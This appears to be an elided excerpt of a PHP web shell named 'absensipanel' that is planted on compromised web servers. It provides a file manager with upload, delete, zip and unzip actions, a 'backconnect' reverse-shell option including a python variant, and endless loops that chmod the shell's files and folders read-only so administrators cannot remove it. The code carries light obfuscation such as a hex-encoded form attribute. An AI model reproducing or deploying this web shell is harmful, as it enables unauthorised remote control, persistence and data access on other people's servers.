...
<head>
    ...
    <title>absensipanel [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li class="logo-absensipanel"><img width="100%" height="400" src="//lirp.cdn-website.com/fbf1dfad/dms3rep/multi/opt/ABSEN+Logo-01-346w.png" align="right"></li>
            <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
                <li class="form-upload"><input type="submit" value="Upload" name="absensipanel-up-submit" class="btn-submit">&nbsp;<input type="file" name="absensipanel-upload" class="form-file"></li>
            </form>
        </ul>
    </div>
    ...
    <div class="menu-file-manager">
        ...
        <table style="width: 100%;">
            ...
            <form action="" method="post">
                <tbody>
                    <!-- absensipanel Folder File Manager -->
                    <?php foreach ($file_manager as $_D) : ?>
                        ...
                        <?php endif; ?>
                    <?php endforeach; ?>
                    <!-- absensipanel Files Manager -->
                    <?php foreach ($file_manager as $_F) : ?>
                        <?php if ($fungsi[3]($_F)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<?= file_ext($_F) ?>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="absensipanel-files"><?= namaPanjang($_F); ?></a></td>
        ...
        <br>
        <select name="absensipanel-select" class="btn-submit">
    ...
    <?php if (isset($_GET['backconnect'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                ...
                <form action="" method="post">
                    <div class="modal-body">
                        <select class="bc-absensipanel box-shadow" name="absensipanel-bc">
...
if (isset($_POST['submit-bc'])) {
    ...
    } else if ($_POST['absensipanel-bc'] == "python") {
...
while (True){
    ...
    if (absensipanel_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
    }
    if (absensipanel_perm("' . __DIR__ . '") != 0555){
        chmod("' . __DIR__ . '", 0555);
    }
}

function absensipanel_perm($flename){
...
if (isset($_POST['absensipanel-up-submit'])) {
    $namaFilenya = $_FILES['absensipanel-upload']['name'];
    $tmpName = $_FILES['absensipanel-upload']['tmp_name'];
...
if (isset($_POST['submit-action'])) {
    $items = $_POST['check'];
    if ($_POST['absensipanel-select'] == "delete") {
        foreach ($items as $it) {
    ...
    } else if ($_POST['absensipanel-select'] == 'unzip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
    ...
    } else if ($_POST['absensipanel-select'] == 'zip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if ($fungsi[3]($fd)) {
...
while (True){
    ...
    if (absensipanel_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
    } 
    if (absensipanel_perm("' . $fungsi[0]() . '") != 0555){
        chmod("' . $fungsi[0]() . '", 0555);
    }
}
